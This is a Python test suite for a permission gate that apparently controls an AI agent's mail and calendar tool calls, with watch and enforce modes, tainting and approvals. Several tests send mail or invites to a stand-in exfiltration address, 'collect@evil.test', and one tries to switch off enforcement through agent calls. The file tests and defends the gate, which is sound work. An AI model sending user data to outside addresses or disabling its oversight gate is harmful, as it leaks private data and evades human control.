import json
import sqlite3
from datetime import date
from pathlib import Path
from typing import Any

import pytest

from broker.approvals.base import ApprovalOutcome
from broker.backends.fake import FakeBackend
from broker.cli import main
from broker.config import ProfileName
from broker.counters import Counters, weekly_report
from broker.gate import ARG_MODELS, RESOURCES, constraints_for
from broker.rules.evaluator import evaluate
from broker.rules.models import Action, Verdict
from tests.conftest import (
    FIXTURE,
    KNOWN_CONTACTS,
    OWN_ADDRESS,
    World,
    WorldFactory,
    build_world,
)
from tests.conftest import fixture_texts as fixture_content_texts

EXFIL = "collect@evil.test"


def log_meta(path: Path) -> list[dict[str, Any]]:
    conn = sqlite3.connect(path)
    rows = [json.loads(r[0]) for r in conn.execute("SELECT metadata FROM log ORDER BY id")]
    conn.close()
    return rows


# --- watch mode --------------------------------------------------------------


def test_watch_mode_runs_would_ask_send_without_prompt(tmp_path: Path) -> None:
    w = build_world(tmp_path, mode="watch")
    result = w.call("send_mail", to=[EXFIL], subject="s", body="b")
    assert result.ok
    assert result.would_have == Verdict.ASK
    assert w.approver.requests == []
    assert len(w.backend.sent) == 1
    meta = log_meta(w.log_path)[-1]
    assert meta["mode"] == "watch"
    assert meta["would_have"] == "ask"


def test_watch_mode_runs_would_deny_and_logs_it(tmp_path: Path) -> None:
    w = build_world(tmp_path, profile="cautious", messages=["m_forward"], mode="watch")
    w.call("read_message", message_id="m_forward")
    result = w.call("send_mail", to=[EXFIL], subject="s", body="b")
    assert result.would_have == Verdict.DENY
    assert len(w.backend.sent) == 1
    assert log_meta(w.log_path)[-1]["would_have"] == "deny"


def test_watch_mode_still_refuses_unknown_tools_and_bad_args(tmp_path: Path) -> None:
    w = build_world(tmp_path, mode="watch")
    assert w.call("forward_message", message_id="m_lunch").verdict == Verdict.DENY
    assert w.call("send_mail", to=[], subject="s", body="b").verdict == Verdict.DENY
    assert w.backend.sent == []


# --- enforce mode: nothing runs unless the decision allows it ----------------


class SpyBackend(FakeBackend):
    """Counts every backend method the gate calls."""

    calls: int = 0

    def __getattribute__(self, name: str) -> Any:
        attr = super().__getattribute__(name)
        if callable(attr) and not name.startswith("_") and name != "from_fixture":
            object.__setattr__(self, "calls", object.__getattribute__(self, "calls") + 1)
        return attr


ARGS: dict[str, dict[str, object]] = {
    "search_mail": {"query": ""},
    "read_message": {"message_id": "m_lunch"},
    "list_events": {},
    "draft_reply": {"message_id": "m_lunch", "body": "ok"},
    "send_mail": {"to": [EXFIL], "subject": "s", "body": "b"},
    "create_event": {"title": "t", "start": "s", "end": "e", "attendees": [EXFIL]},
    "forward_message": {"message_id": "m_lunch"},
}


def policy_verdict(w: World, tool: str, args: dict[str, object]) -> Verdict:
    """What the profile says for this call, evaluated without going through the gate."""
    if tool not in ARG_MODELS:
        return Verdict.DENY
    parsed = ARG_MODELS[tool].model_validate(args)
    constraints = constraints_for(w.session, parsed)
    action = Action(tool=tool, resource=RESOURCES[tool], constraints=constraints)
    return evaluate(w.gate.profile, action).verdict


@pytest.mark.parametrize("profile", ["cautious", "working", "autonomous"])
@pytest.mark.parametrize("tainted", [False, True])
@pytest.mark.parametrize(
    "answer", [ApprovalOutcome.APPROVED, ApprovalOutcome.DENIED, ApprovalOutcome.TIMEOUT]
)
def test_enforce_mode_never_runs_a_call_the_decision_did_not_allow(
    tmp_path: Path, profile: ProfileName, tainted: bool, answer: ApprovalOutcome
) -> None:
    w = build_world(tmp_path, profile, ["m_lunch", "m_forward"], None, None, answer)
    spy = SpyBackend(messages=w.backend.messages, events=w.backend.events)
    w.gate.backend = spy
    if tainted:
        w.call("read_message", message_id="m_forward")
    for tool, args in ARGS.items():
        expected = policy_verdict(w, tool, args)  # computed apart from the gate's own answer
        before = spy.calls
        result = w.call(tool, **args)
        ran = spy.calls > before
        allowed = expected in (Verdict.ALLOW, Verdict.ALLOW_REDACTED)
        approved = expected == Verdict.ASK and result.approval == ApprovalOutcome.APPROVED
        assert ran == (allowed or approved), (tool, expected, result)
        assert result.would_have is None


def test_mode_cannot_be_changed_by_an_agent_call(world: WorldFactory) -> None:
    w = world()
    for tool, args in (
        ("set_mode", {"mode": "watch"}),
        ("config", {"mode": "watch"}),
        ("send_mail", {"to": [EXFIL], "subject": "s", "body": "b", "mode": "watch"}),
        ("search_mail", {"query": "", "mode": "watch"}),
    ):
        assert w.call(tool, **args).verdict == Verdict.DENY
    assert w.gate.mode == "enforce"
    with pytest.raises(AttributeError):
        w.gate.mode = "watch"  # type: ignore[misc]
    assert w.backend.sent == []


# --- counters and report -----------------------------------------------------


def test_counters_count_calls_prompts_and_answers(tmp_path: Path) -> None:
    w = build_world(tmp_path, script=[ApprovalOutcome.APPROVED], default=ApprovalOutcome.DENIED)
    counters = Counters(tmp_path / "counters.json")
    w.gate.counters = counters
    w.call("search_mail")
    w.call("send_mail", to=["alice@work.test"], subject="s", body="b")
    w.call("send_mail", to=["alice@work.test"], subject="s", body="b")
    w.call("forward_message")
    day = counters.days[w.clock.now.date().isoformat()]
    assert day["calls"] == 4
    assert day["prompts"] == 2
    assert day["approvals"]["approved"] == 1
    assert day["approvals"]["denied"] == 1
    assert day["decisions"]["deny"] == 1
    reopened = Counters(tmp_path / "counters.json")
    assert reopened.days == counters.days


def test_report_and_counters_never_hold_content(tmp_path: Path) -> None:
    w = build_world(tmp_path, default=ApprovalOutcome.APPROVED, views_full_body=True)
    counters = Counters(tmp_path / "counters.json")
    w.gate.counters = counters
    w.call("search_mail", limit=50)
    for message in w.backend.messages:
        w.call("read_message", message_id=message.id)
        w.call("draft_reply", message_id=message.id, body="ok")
    w.call("list_events")
    w.call("send_mail", to=[EXFIL, "alice@work.test"], subject="Quarterly numbers", body="4.2M")
    w.call("create_event", title="Board prep", start="s", end="e", attendees=[EXFIL])
    report = weekly_report(counters, w.clock.now.date())
    stored = (tmp_path / "counters.json").read_text(encoding="utf-8")
    backend = FakeBackend.from_fixture(FIXTURE)
    addresses = {OWN_ADDRESS, EXFIL, *KNOWN_CONTACTS}
    addresses |= {m.sender for m in backend.messages} | {e.organizer for e in backend.events}
    forbidden = [t for t in fixture_content_texts() if len(t) >= 4]
    forbidden += [*addresses, "Quarterly numbers", "Board prep", "4.2M", "@"]
    for text in forbidden:
        assert text not in report, text
        assert text not in stored, text


def test_report_cli(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    config = tmp_path / "config.yaml"
    config.write_text(f"own_address: me@home.test\nstate_dir: {tmp_path}\n", encoding="utf-8")
    counters = Counters(tmp_path / "counters.json")
    counters.record(date(2026, 10, 27), Verdict.ASK, ApprovalOutcome.APPROVED, None)
    counters.record(date(2026, 10, 27), Verdict.ALLOW, None, None)
    assert main(["report", "--config", str(config), "--end", "2026-10-27"]) == 0
    out = capsys.readouterr().out
    assert "days with at least one call: 1 of 7" in out
    assert "calls: 2" in out
    assert "approved: 1" in out
